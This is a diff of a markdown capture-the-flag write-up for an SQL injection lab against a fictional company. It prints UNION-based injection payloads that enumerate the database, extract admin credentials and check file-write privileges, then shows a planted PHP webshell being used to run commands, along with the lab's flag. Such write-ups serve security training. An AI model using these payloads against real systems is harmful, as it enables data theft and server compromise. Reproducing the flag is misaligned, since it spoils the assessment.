@@ -1,7 +1,10 @@
 ---
 sticker: lucide//database-backup
 ---
-The company `Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.
+
+# Skills Assessment - SQL Injection Fundamentals
+
+The company `Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.
 
 They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.
 
@@ -9,14 +12,15 @@ They provided a target IP address and no further information about their website
 
 Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203155825.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203155825.png)
 
-# Bypassing the login page
----
+## Bypassing the login page
+
+***
 
 First thing we face is the login page, we can begin this assessment by checking the source code: `CTRL+U`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203155958.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203155958.png)
 
 They haven't forgotten about any credentials or anything related, next thing in mind is trying the most simple SQLI payload:
 
@@ -26,25 +30,27 @@ They haven't forgotten about any credentials or anything related, next thing in 
 
 We can try this in the username section:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203160114.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203160114.png)
 
 To our surprise, we were able to successfully log in:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203160137.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203160137.png)
 
-# Database enumeration
----
+## Database enumeration
+
+***
 
 We can go along with our roleplay, this part is not strictly related to the path intended to obtain the flag, but we can take advantage of the roleplay relating the company assessment and enumerate the database a little bit.
 
 We are inside a dashboard panel, nothing seems off but the first thing we can notice is a search bar on the top right of the screen:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203160237.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203160237.png)
 
 From previous modules, we found the way to enumerate the database, we can try the following:
 
-## Columns number
----
+### Columns number
+
+***
 
 We can enumerate the number of columns by using `ORDER BY`:
 
@@ -54,22 +60,21 @@ We can enumerate the number of columns by using `ORDER BY`:
 
 We need to increase the number until we get an error specifying we're off the number of columns, let's automatize this by sending the request to burp's intruder and using it in the following way:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203160644.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203160644.png)
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203160804.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203160804.png)
 
 After checking the responses we can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203161026.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203161026.png)
 
 Error message starts in `6`, so, the number of columns is `5`.
 
 Knowing this, we can start next step.
 
-## Union Injection
----
+### Union Injection
+
+***
 
 We can use the following to check if the Union Injection is working:
 
@@ -79,7 +84,7 @@ cn' UNION select 1,@@version,3,4,5-- -
 
 We are using this since we know the number of columns, we'll get the following output:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203161321.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203161321.png)
 
 So it indeed works, now we can begin to read the database:
 
@@ -89,7 +94,7 @@ cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
 
 We get the following:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203161420.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203161420.png)
 
 The `backup` table seems interesting, we can check it out:
 
@@ -97,7 +102,7 @@ The `backup` table seems interesting, we can check it out:
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203161536.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203161536.png)
 
 We see the following, `admin_bk`, we can enumerate the columns in `admin_bk` using this:
 
@@ -107,7 +112,7 @@ cn' UNION SELECT 1,COLUMN_NAME,DATA_TYPE,4,5 FROM INFORMATION_SCHEMA.COLUMNS WHE
 
 We will see the following:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203162243.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203162243.png)
 
 Got `username` and `password`, let's read it:
 
@@ -115,7 +120,7 @@ Got `username` and `password`, let's read it:
 cn' UNION SELECT 1,username,password,4,5 FROM backup.admin_bk-- -
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203162347.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203162347.png)
 
 Got credentials:
 
@@ -123,15 +128,17 @@ Got credentials:
 `admin`:`Inl@n3_fre1gh7_adm!n`
 ```
 
-# Now, Let's go for our flag
----
+## Now, Let's go for our flag
+
+***
 
 Nice, this was just an scenario to enumerate the risks of this vulnerability on the system, since in the roleplay we are doing an assessment for a company, it was important to check the enumeration part.
 
 For our flag, we can simply try to upload a webshell in the following way.
 
-## Checking our write privileges
----
+### Checking our write privileges
+
+***
 
 We can check if we have high privileges with this:
 
@@ -139,7 +146,7 @@ We can check if we have high privileges with this:
 ' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- -
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203163116.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203163116.png)
 
 We can check we got `Y`, which stands for yes, meaning we have privileges, in order to write files, three conditions must be there:
 
@@ -155,7 +162,7 @@ Let's check if `secure_file_priv` variable is not enabled:
 ' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203163254.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203163254.png)
 
 Value is empty, which means it is not enabled.
 
@@ -167,7 +174,7 @@ We can test writing with the following:
 
 If we visit `/proof.txt`, we can check the following:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203163428.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203163428.png)
 
 We've written successfully, we can now write our webshell in the following way:
 
@@ -179,19 +186,16 @@ We can confirm it worked by going to:
 
 `http://IP:PORT/dashboard/webshell.php?0=id`
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203164153.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203164153.png)
 
 Let's list the `/` directory: `ls+/`
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203164320.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203164320.png)
 
 We can see the flag, we can simply read it by using `cat+/flag_cae1dadcd174.txt`
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203164435.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203164435.png)
 
 Got our flag: `528d6d9cedc2c7aab146ef226e918396`
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250203164504.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250203164504.png)
